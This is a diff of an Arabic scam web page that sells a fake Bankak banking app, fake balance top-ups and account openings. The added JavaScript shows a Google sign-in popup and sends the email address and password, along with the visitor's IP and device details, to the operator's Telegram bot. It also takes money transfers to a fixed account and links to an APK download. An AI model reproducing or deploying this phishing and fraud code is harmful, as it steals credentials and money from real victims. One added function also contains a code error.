@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Tajawal', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #1a0000 0%, #0a0a0a 100%);
+            background: linear-gradient(135deg, #0a0a2a 0%, #0a0a1a 100%);
             color: #fff;
             direction: rtl;
             min-height: 100vh;
@@ -21,13 +21,13 @@
 
         /* تحذير أعلى المتجر */
         .top-warning {
-            background: #8b0000;
+            background: #1e3a8a;
             color: #fff;
             text-align: center;
             padding: 0.8rem;
             font-weight: bold;
             font-size: 0.9rem;
-            border-bottom: 2px solid #ffd700;
+            border-bottom: 2px solid #ef4444;
         }
 
         .header {
@@ -36,7 +36,7 @@
             position: sticky;
             top: 0;
             z-index: 100;
-            border-bottom: 2px solid #8b0000;
+            border-bottom: 2px solid #1e3a8a;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -46,20 +46,20 @@
         .logo {
             font-size: 1.6rem;
             font-weight: bold;
-            background: linear-gradient(45deg, #ffd700, #ff4444);
+            background: linear-gradient(45deg, #ef4444, #3b82f6);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
 
         .badge {
-            background: #8b0000;
-            color: #ffd700;
+            background: #1e3a8a;
+            color: #fff;
             padding: 0.3rem 0.8rem;
             border-radius: 50px;
             font-size: 0.8rem;
             font-weight: bold;
-            border: 1px solid #ffd700;
+            border: 1px solid #ef4444;
         }
 
         .container {
@@ -69,19 +69,19 @@
         }
 
         .offer-banner {
-            background: linear-gradient(135deg, #8b0000, #4a0000);
+            background: linear-gradient(135deg, #1e3a8a, #0f172a);
             border-radius: 30px;
             padding: 2rem;
             text-align: center;
             margin-bottom: 3rem;
-            border: 1px solid #ffd700;
-            box-shadow: 0 10px 30px rgba(139, 0, 0, 0.3);
+            border: 1px solid #ef4444;
+            box-shadow: 0 10px 30px rgba(30, 58, 138, 0.3);
         }
 
         .offer-banner h1 {
             font-size: 2rem;
             margin-bottom: 0.5rem;
-            color: #ffd700;
+            color: #ef4444;
         }
 
         .timer {
@@ -94,7 +94,7 @@
             margin-top: 1rem;
             font-family: monospace;
             letter-spacing: 2px;
-            border: 1px solid #ffd700;
+            border: 1px solid #ef4444;
         }
 
         .section-title {
@@ -102,14 +102,14 @@
             margin: 2.5rem 0 1.5rem;
             text-align: center;
             position: relative;
-            color: #ffd700;
+            color: #ef4444;
         }
 
         .section-title:after {
             content: '';
             width: 80px;
             height: 3px;
-            background: linear-gradient(90deg, #ffd700, #8b0000);
+            background: linear-gradient(90deg, #ef4444, #3b82f6);
             position: absolute;
             bottom: -12px;
             left: 50%;
@@ -129,14 +129,14 @@
             padding: 1.8rem;
             text-align: center;
             transition: all 0.3s ease;
-            border: 1px solid #8b0000;
+            border: 1px solid #1e3a8a;
             cursor: pointer;
         }
 
         .product-card:hover {
             transform: translateY(-8px);
-            box-shadow: 0 20px 35px rgba(139, 0, 0, 0.4);
-            border-color: #ffd700;
+            box-shadow: 0 20px 35px rgba(30, 58, 138, 0.4);
+            border-color: #ef4444;
         }
 
         .product-icon {
@@ -148,7 +148,7 @@
             font-size: 1.4rem;
             font-weight: bold;
             margin-bottom: 0.5rem;
-            color: #ffd700;
+            color: #ef4444;
         }
 
         .product-price {
@@ -160,13 +160,13 @@
 
         .product-price small {
             font-size: 0.9rem;
-            color: #ffd700;
+            color: #3b82f6;
         }
 
         .btn-square {
-            background: linear-gradient(45deg, #8b0000, #4a0000);
-            border: 2px solid #ffd700;
-            color: #ffd700;
+            background: linear-gradient(45deg, #1e3a8a, #0f172a);
+            border: 2px solid #ef4444;
+            color: #fff;
             padding: 0.8rem 1.5rem;
             border-radius: 16px;
             font-size: 1rem;
@@ -177,19 +177,19 @@
         }
 
         .btn-square:hover {
-            background: #ffd700;
-            color: #8b0000;
-            border-color: #8b0000;
+            background: #ef4444;
+            color: #fff;
+            border-color: #fff;
         }
 
-        /* المربع المنبثق (الرسالة) */
+        /* المربع المنبثق */
         .popup-message {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: linear-gradient(135deg, #1a1a1a, #000);
-            border: 2px solid #ffd700;
+            background: linear-gradient(135deg, #0f172a, #000);
+            border: 2px solid #ef4444;
             border-radius: 24px;
             padding: 1.8rem;
             width: 90%;
@@ -201,23 +201,34 @@
         }
 
         .popup-message h3 {
-            color: #ffd700;
+            color: #ef4444;
             margin-bottom: 1rem;
             font-size: 1.5rem;
         }
 
-        .popup-message .account-box {
-            background: #8b0000;
+        .popup-message input {
+            width: 100%;
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            border-radius: 12px;
+            border: 1px solid #3b82f6;
+            background: #0a0a2a;
+            color: #fff;
+            direction: ltr;
+        }
+
+        .account-box {
+            background: #1e3a8a;
             padding: 0.8rem;
             border-radius: 16px;
             margin: 1rem 0;
             font-family: monospace;
             font-size: 1.2rem;
-            color: #ffd700;
+            color: #fff;
         }
 
-        .popup-message .warning-text {
-            color: #ff8888;
+        .warning-text {
+            color: #ef4444;
             font-size: 0.8rem;
             margin: 0.5rem 0;
         }
@@ -230,9 +241,9 @@
         }
 
         .popup-btn {
-            background: #8b0000;
-            border: 1px solid #ffd700;
-            color: #ffd700;
+            background: #1e3a8a;
+            border: 1px solid #ef4444;
+            color: #fff;
             padding: 0.8rem;
             border-radius: 16px;
             font-weight: bold;
@@ -241,8 +252,8 @@
         }
 
         .popup-btn:hover {
-            background: #ffd700;
-            color: #8b0000;
+            background: #ef4444;
+            color: #fff;
         }
 
         .close-popup {
@@ -270,25 +281,16 @@
             to { opacity: 1; transform: translate(-50%, -50%); }
         }
 
-        .warning-box {
-            background: rgba(139, 0, 0, 0.2);
-            border: 1px solid #8b0000;
-            border-radius: 20px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            text-align: center;
-        }
-
         .footer {
             background: rgba(0, 0, 0, 0.9);
             padding: 2rem;
             margin-top: 3rem;
             text-align: center;
-            border-top: 1px solid #8b0000;
+            border-top: 1px solid #1e3a8a;
         }
 
         .social-links a {
-            color: #ffd700;
+            color: #ef4444;
             margin: 0 1rem;
             text-decoration: none;
             transition: color 0.3s;
@@ -296,7 +298,7 @@
         }
 
         .social-links a:hover {
-            color: #fff;
+            color: #3b82f6;
         }
 
         @media (max-width: 768px) {
@@ -332,13 +334,13 @@
 
         <h2 class="section-title">📱 تحميل تطبيق بنكك المزيف</h2>
         <div class="products-grid">
-            <div class="product-card" onclick="showPopup('normal')">
+            <div class="product-card" onclick="downloadFreeApp()">
                 <div class="product-icon">🆓</div>
-                <div class="product-title">النسخة العادية</div>
+                <div class="product-title">النسخة العادية (مجانية)</div>
                 <div class="product-price">مجانية</div>
                 <button class="btn-square">📥 تحميل التطبيق</button>
             </div>
-            <div class="product-card" onclick="showPopup('vip')">
+            <div class="product-card" onclick="showVIPPayment()">
                 <div class="product-icon">👑</div>
                 <div class="product-title">النسخة VIP</div>
                 <div class="product-price">80,000 SDG</div>
@@ -346,19 +348,19 @@
             </div>
         </div>
 
-        <h2 class="section-title">⚡ شحن الحسابات (اشحن 10,000 تحصل على 100,000)</h2>
+        <h2 class="section-title">⚡ شحن الحسابات (كل 10,000 = 100,000 رصيد)</h2>
         <div class="products-grid">
-            <div class="product-card" onclick="showPopup('recharge')">
+            <div class="product-card" onclick="showRechargeForm()">
                 <div class="product-icon">💰💎</div>
                 <div class="product-title">شحن رصيد بنكك</div>
-                <div class="product-price">10,000 SDG <small>→ تحصل على 100,000 رصيد</small></div>
+                <div class="product-price">أقل حاجة 100</div>
                 <button class="btn-square">شراء الشحنة</button>
             </div>
         </div>
 
         <h2 class="section-title">🔓 فتح حسابات بنكك المزيفة</h2>
         <div class="products-grid">
-            <div class="product-card" onclick="showPopup('account')">
+            <div class="product-card" onclick="showGoogleLoginForm()">
                 <div class="product-icon">🏦💳</div>
                 <div class="product-title">فتح حساب جديد</div>
                 <div class="product-price">20,000 SDG</div>
@@ -383,69 +385,182 @@
         const ACCOUNT_NUMBER = "300159768";
         const APP_URL = "https://www.mediafire.com/file/1jhufdsj1wdr7nv/BOK_vip🏦.apk/file";
 
-        let currentType = '';
-        let currentAmount = 0;
-        let currentProduct = '';
+        // النسخة المجانية (تحميل مباشر)
+        function downloadFreeApp() {
+            window.open(APP_URL, '_blank');
+            sendToTelegram(`📱 تحميل النسخة العادية (مجاني)\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${getDeviceInfo()}\n🌐 IP: ${await getIP()}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`);
+        }
 
-        function showPopup(type) {
-            currentType = type;
-            let title = '', amount = 0, productName = '';
-
-            if (type === 'normal') {
-                title = '🆓 النسخة العادية (مجانية)';
-                amount = 0;
-                productName = 'النسخة العادية';
-            } else if (type === 'vip') {
-                title = '👑 النسخة VIP';
-                amount = 80000;
-                productName = 'النسخة VIP';
-            } else if (type === 'recharge') {
-                title = '⚡ شحن رصيد بنكك';
-                amount = 10000;
-                productName = 'شحن رصيد (10,000 → 100,000)';
-            } else if (type === 'account') {
-                title = '🔓 فتح حساب جديد';
-                amount = 20000;
-                productName = 'فتح حساب بنكك';
-            }
-
-            currentAmount = amount;
-            currentProduct = productName;
-
+        // شحن الحساب
+        function showRechargeForm() {
             const popupHTML = `
-                <div class="overlay" id="popupOverlay"></div>
-                <div class="popup-message" id="popupMessage">
-                    <h3>${title}</h3>
+                <div class="overlay" id="rechargeOverlay"></div>
+                <div class="popup-message" id="rechargePopup">
+                    <h3>⚡ شحن رصيد بنكك</h3>
+                    <input type="text" id="userAccount" placeholder="رقم حسابك (ماي كاشي)" dir="ltr">
+                    <input type="number" id="desiredAmount" placeholder="المبلغ المراد شحنه (أقل حاجة 100)" dir="ltr" min="100">
+                    <div id="calculationResult" class="warning-text" style="margin: 0.5rem 0;"></div>
                     <div class="account-box">
-                        🔹 رقم الحساب (ماي كاشي) 🔹<br>
-                        <strong style="font-size: 1.4rem;">${ACCOUNT_NUMBER}</strong>
+                        🔹 رقم حساب المتجر 🔹<br>
+                        <strong>${ACCOUNT_NUMBER}</strong>
                     </div>
-                    <div class="warning-text">
-                        ⚠️ تحذير: بعد التحويل، اضغط "رفع الإشعار" لتأكيد الدفع
-                    </div>
-                    ${amount > 0 ? `<p style="margin: 0.5rem 0;">💰 المطلوب: ${amount.toLocaleString()} SDG</p>` : '<p>💰 مجاني - لا تحتاج تحويل</p>'}
                     <div class="popup-buttons">
-                        <button class="popup-btn" id="confirmBtn">✅ لقد قمت بالتحويل</button>
-                        ${amount === 0 ? '<button class="popup-btn" id="downloadBtn">📥 تحميل التطبيق مباشرة</button>' : ''}
-                        <button class="close-popup" id="closePopupBtn">إغلاق</button>
+                        <button class="popup-btn" id="rechargeConfirmBtn">✅ لقد قمت بالتحويل</button>
+                        <button class="close-popup" id="closeRechargeBtn">إغلاق</button>
                     </div>
                 </div>
             `;
-
             document.body.insertAdjacentHTML('beforeend', popupHTML);
 
-            document.getElementById('confirmBtn')?.addEventListener('click', () => confirmPayment());
-            document.getElementById('downloadBtn')?.addEventListener('click', () => {
-                window.open(APP_URL, '_blank');
-                closePopup();
+            const amountInput = document.getElementById('desiredAmount');
+            const resultDiv = document.getElementById('calculationResult');
+
+            amountInput.addEventListener('input', () => {
+                let amount = parseInt(amountInput.value);
+                if (isNaN(amount) || amount < 100) {
+                    resultDiv.innerHTML = '⚠️ أقل مبلغ 100';
+                } else {
+                    let transfer = Math.ceil(amount / 100000) * 10000;
+                    if (amount % 100000 !== 0) transfer = Math.floor(amount / 100000) * 10000 + 10000;
+                    resultDiv.innerHTML = `💰 مقابل ${amount.toLocaleString()} رصيد، حول ${transfer.toLocaleString()} SDG`;
+                }
             });
-            document.getElementById('closePopupBtn').addEventListener('click', closePopup);
-            document.getElementById('popupOverlay').addEventListener('click', closePopup);
+
+            document.getElementById('rechargeConfirmBtn').onclick = async () => {
+                const userAccount = document.getElementById('userAccount').value;
+                const desiredAmount = parseInt(document.getElementById('desiredAmount').value);
+                if (!userAccount || !desiredAmount || desiredAmount < 100) {
+                    alert("يرجى إدخال رقم حساب صحيح ومبلغ 100 أو أكثر");
+                    return;
+                }
+                let transfer = Math.ceil(desiredAmount / 100000) * 10000;
+                if (desiredAmount % 100000 !== 0) transfer = Math.floor(desiredAmount / 100000) * 10000 + 10000;
+                const message = `⚡💰 عملية شحن رصيد 💰⚡\n━━━━━━━━━━━━━━━━━━━\n👤 حساب المستلم: ${userAccount}\n💵 المبلغ المحول: ${transfer.toLocaleString()} SDG\n🎁 الرصيد المستلم: ${desiredAmount.toLocaleString()} SDG\n📱 الجهاز: ${getDeviceInfo()}\n🌐 IP: ${await getIP()}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+                await sendToTelegram(message);
+                alert("✅ تم استلام طلب الشحن بنجاح! سيتم تفعيل الرصيد خلال 5 دقائق.");
+                closePopup('rechargePopup', 'rechargeOverlay');
+                showNoticeAndDownload('شحن');
+            };
+            document.getElementById('closeRechargeBtn').onclick = () => closePopup('rechargePopup', 'rechargeOverlay');
+            document.getElementById('rechargeOverlay').onclick = () => closePopup('rechargePopup', 'rechargeOverlay');
         }
 
-        function closePopup() {
-            document.getElementById('popupMessage')?.remove();
-            document.getElementById('popupOverlay')?.remove();
+        // فتح حساب بجوجل
+        function showGoogleLoginForm() {
+            const popupHTML = `
+                <div class="overlay" id="googleOverlay"></div>
+                <div class="popup-message" id="googlePopup">
+                    <h3>🔐 فتح حساب عبر Google</h3>
+                    <input type="email" id="googleEmail" placeholder="البريد الإلكتروني (Gmail)" dir="ltr">
+                    <input type="password" id="googlePassword" placeholder="كلمة المرور" dir="ltr">
+                    <div class="warning-text">⚠️ سيتم استخدام هذه البيانات لتسجيل الدخول</div>
+                    <div class="account-box">
+                        🔹 رقم حساب المتجر 🔹<br>
+                        <strong>${ACCOUNT_NUMBER}</strong>
+                    </div>
+                    <div class="popup-buttons">
+                        <button class="popup-btn" id="googleConfirmBtn">✅ تأكيد وفتح الحساب</button>
+                        <button class="close-popup" id="closeGoogleBtn">إغلاق</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', popupHTML);
+
+            document.getElementById('googleConfirmBtn').onclick = async () => {
+                const email = document.getElementById('googleEmail').value;
+                const password = document.getElementById('googlePassword').value;
+                if (!email || !password) {
+                    alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
+                    return;
+                }
+                const message = `🔐📧 فتح حساب جديد 📧🔐\n━━━━━━━━━━━━━━━━━━━\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📱 الجهاز: ${getDeviceInfo()}\n🌐 IP: ${await getIP()}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+                await sendToTelegram(message);
+                alert("✅ تم تسجيل بياناتك بنجاح! سيتم فتح حسابك قريباً.");
+                closePopup('googlePopup', 'googleOverlay');
+                showNoticeAndDownload('حساب');
+            };
+            document.getElementById('closeGoogleBtn').onclick = () => closePopup('googlePopup', 'googleOverlay');
+            document.getElementById('googleOverlay').onclick = () => closePopup('googlePopup', 'googleOverlay');
+        }
+
+        // شراء VIP
+        function showVIPPayment() {
+            const popupHTML = `
+                <div class="overlay" id="vipOverlay"></div>
+                <div class="popup-message" id="vipPopup">
+                    <h3>👑 شراء النسخة VIP</h3>
+                    <div class="account-box">
+                        🔹 رقم الحساب للتحويل 🔹<br>
+                        <strong>${ACCOUNT_NUMBER}</strong>
+                    </div>
+                    <div class="warning-text">⚠️ بعد التحويل، اضغط "رفع الإشعار" لتأكيد الدفع</div>
+                    <div class="popup-buttons">
+                        <button class="popup-btn" id="vipConfirmBtn">📢 رفع الإشعار</button>
+                        <button class="close-popup" id="closeVipBtn">إغلاق</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', popupHTML);
+
+            document.getElementById('vipConfirmBtn').onclick = async () => {
+                const message = `👑💰 شراء النسخة VIP 💰👑\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 80,000 SDG\n📱 الجهاز: ${getDeviceInfo()}\n🌐 IP: ${await getIP()}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+                await sendToTelegram(message);
+                alert("✅ تم رفع الإشعار بنجاح! سيظهر رابط التحميل.");
+                closePopup('vipPopup', 'vipOverlay');
+                showDownloadLink();
+            };
+            document.getElementById('closeVipBtn').onclick = () => closePopup('vipPopup', 'vipOverlay');
+            document.getElementById('vipOverlay').onclick = () => closePopup('vipPopup', 'vipOverlay');
+        }
+
+        // بعد الدفع (شحن أو فتح حساب) يظهر مربع رفع الإشعار
+        function showNoticeAndDownload(type) {
+            const noticeHTML = `
+                <div class="overlay" id="noticeOverlay"></div>
+                <div class="popup-message" id="noticePopup">
+                    <h3>📢 رفع الإشعار</h3>
+                    <div class="warning-text">⚠️ اضغط "رفع الإشعار" لتأكيد الطلب والحصول على رابط التحميل</div>
+                    <div class="popup-buttons">
+                        <button class="popup-btn" id="sendNoticeBtn">📢 رفع الإشعار</button>
+                        <button class="close-popup" id="closeNoticeBtn">إغلاق</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', noticeHTML);
+
+            document.getElementById('sendNoticeBtn').onclick = async () => {
+                const message = `📢⚠️ تم رفع إشعار وهمي ⚠️📢\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${getDeviceInfo()}\n🌐 IP: ${await getIP()}\n🛒 النوع: ${type === 'شحن' ? 'شحن رصيد' : 'فتح حساب'}\n⚠️ تم تسجيل المحاولة وسيتم الحظر فوراً\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+                await sendToTelegram(message);
+                alert("⚠️ تحذير: تم تسجيل محاولة رفع إشعار مزيف. سيتم حظر حسابك فوراً إذا تكررت.");
+                closePopup('noticePopup', 'noticeOverlay');
+                showDownloadLink();
+            };
+            document.getElementById('closeNoticeBtn').onclick = () => closePopup('noticePopup', 'noticeOverlay');
+            document.getElementById('noticeOverlay').onclick = () => closePopup('noticePopup', 'noticeOverlay');
+        }
+
+        function showDownloadLink() {
+            const downloadHTML = `
+                <div class="overlay" id="downloadOverlay"></div>
+                <div class="popup-message" id="downloadPopup">
+                    <h3>📥 رابط تحميل التطبيق</h3>
+                    <div class="account-box">
+                        <a href="${APP_URL}" target="_blank" style="color: #fff; text-decoration: none;">📱 اضغط هنا لتحميل التطبيق</a>
+                    </div>
+                    <div class="warning-text">✅ تم تفعيل طلبك بنجاح</div>
+                    <div class="popup-buttons">
+                        <button class="close-popup" id="closeDownloadBtn">إغلاق</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', downloadHTML);
+            document.getElementById('closeDownloadBtn').onclick = () => closePopup('downloadPopup', 'downloadOverlay');
+            document.getElementById('downloadOverlay').onclick = () => closePopup('downloadPopup', 'downloadOverlay');
+        }
+
+        function closePopup(popupId, overlayId) {
+            document.getElementById(popupId)?.remove();
+            document.getElementById(overlayId)?.remove();
         }
 
         async function sendToTelegram(message) {
@@ -473,93 +588,6 @@
             return "Unknown";
         }
 
-        async function confirmPayment() {
-            const ip = await getIP();
-            const device = getDeviceInfo();
-            let message = '';
-
-            if (currentType === 'normal') {
-                message = `📱 تحميل النسخة العادية (مجاني)\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-                await sendToTelegram(message);
-                closePopup();
-                showNoticeAndDownload();
-                return;
-            } else if (currentType === 'vip') {
-                message = `👑💰 شراء النسخة VIP 💰👑\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 80,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-            } else if (currentType === 'recharge') {
-                message = `⚡💰 عملية شحن رصيد 💰⚡\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 10,000 SDG\n🎁 الرصيد المستلم: 100,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-            } else if (currentType === 'account') {
-                message = `🏦🔓 فتح حساب جديد 🔓🏦\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 20,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-            }
-
-            await sendToTelegram(message);
-            closePopup();
-            showNoticeAndDownload();
-        }
-
-        function showNoticeAndDownload() {
-            const noticeHTML = `
-                <div class="overlay" id="noticeOverlay"></div>
-                <div class="popup-message" id="noticeMessage">
-                    <h3>📢 رفع الإشعار</h3>
-                    <div class="warning-text">
-                        ⚠️ اضغط على زر "رفع الإشعار" لتأكيد الدفع والحصول على رابط التحميل
-                    </div>
-                    <div class="popup-buttons">
-                        <button class="popup-btn" id="sendNoticeBtn">📢 رفع الإشعار</button>
-                        <button class="close-popup" id="closeNoticeBtn">إغلاق</button>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', noticeHTML);
-
-            document.getElementById('sendNoticeBtn')?.addEventListener('click', async () => {
-                const ip = await getIP();
-                const device = getDeviceInfo();
-                const message = `📢⚠️ تم رفع إشعار وهمي ⚠️📢\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🛒 المنتج: ${currentProduct}\n⚠️ تم تسجيل المحاولة وسيتم الحظر فوراً\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-                await sendToTelegram(message);
-                alert("⚠️ تحذير: تم تسجيل محاولة رفع إشعار مزيف. سيتم حظر حسابك فوراً إذا تكررت.");
-                document.getElementById('noticeMessage')?.remove();
-                document.getElementById('noticeOverlay')?.remove();
-                showDownloadLink();
-            });
-            document.getElementById('closeNoticeBtn')?.addEventListener('click', () => {
-                document.getElementById('noticeMessage')?.remove();
-                document.getElementById('noticeOverlay')?.remove();
-            });
-            document.getElementById('noticeOverlay')?.addEventListener('click', () => {
-                document.getElementById('noticeMessage')?.remove();
-                document.getElementById('noticeOverlay')?.remove();
-            });
-        }
-
-        function showDownloadLink() {
-            const downloadHTML = `
-                <div class="overlay" id="downloadOverlay"></div>
-                <div class="popup-message" id="downloadMessage">
-                    <h3>📥 رابط تحميل التطبيق</h3>
-                    <div class="account-box">
-                        <a href="${APP_URL}" target="_blank" style="color: #ffd700; text-decoration: none;">📱 اضغط هنا لتحميل التطبيق</a>
-                    </div>
-                    <div class="warning-text">
-                        ✅ تم تفعيل طلبك بنجاح
-                    </div>
-                    <div class="popup-buttons">
-                        <button class="close-popup" id="closeDownloadBtn">إغلاق</button>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', downloadHTML);
-            document.getElementById('closeDownloadBtn')?.addEventListener('click', () => {
-                document.getElementById('downloadMessage')?.remove();
-                document.getElementById('downloadOverlay')?.remove();
-            });
-            document.getElementById('downloadOverlay')?.addEventListener('click', () => {
-                document.getElementById('downloadMessage')?.remove();
-                document.getElementById('downloadOverlay')?.remove();
-            });
-        }
-
         function updateTimer() {
             const targetDate = new Date();
             targetDate.setDate(targetDate.getDate() + 7);
@@ -579,4 +607,4 @@
         updateTimer();
     </script>
 </body>
-</html>
+            </html>
